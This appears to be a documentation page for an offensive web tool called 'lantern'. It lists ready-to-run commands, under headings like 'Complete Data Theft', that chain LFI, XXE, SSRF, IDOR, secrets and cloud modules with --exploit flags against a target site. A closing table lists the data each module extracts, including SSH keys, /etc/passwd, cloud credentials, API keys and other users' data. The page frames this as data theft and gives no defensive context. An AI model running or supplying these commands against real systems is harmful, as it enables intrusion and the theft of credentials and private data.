[← Back to Index](../INDEX.md)

# Data Extraction Modules

Command examples for extracting sensitive data, credentials, and files.

---

## Sensitive Data Discovery

```bash
lantern -t https://target.com -m secrets,disclosure,dirbust,lfi,xxe --exploit --crawl
```

## Cloud & Secrets Extraction

```bash
lantern -t https://target.com -m cloud,secrets,ssrf,disclosure --exploit --aggressive
```

## File Reading Chain

```bash
lantern -t https://target.com -m lfi,xxe,download,dirbust --exploit --deep
```

## Complete Data Theft

```bash
lantern -t https://target.com -m ssrf,lfi,xxe,idor,disclosure,dirbust,secrets,cloud --exploit --aggressive
```

---

## What Gets Extracted

| Module | Data Extracted |
|--------|----------------|
| `ssrf` | AWS/GCP credentials, internal services |
| `lfi` | /etc/passwd, .env, config files, SSH keys |
| `xxe` | Files, cloud metadata |
| `secrets` | API keys, JWTs, passwords, AWS keys |
| `disclosure` | Git repos, backup files, configs |
| `cloud` | S3 buckets, Azure blobs, GCP storage |
| `idor` | Other users' data |

---

[← Back to Index](../INDEX.md) | [Next: Configuration →](config.md)
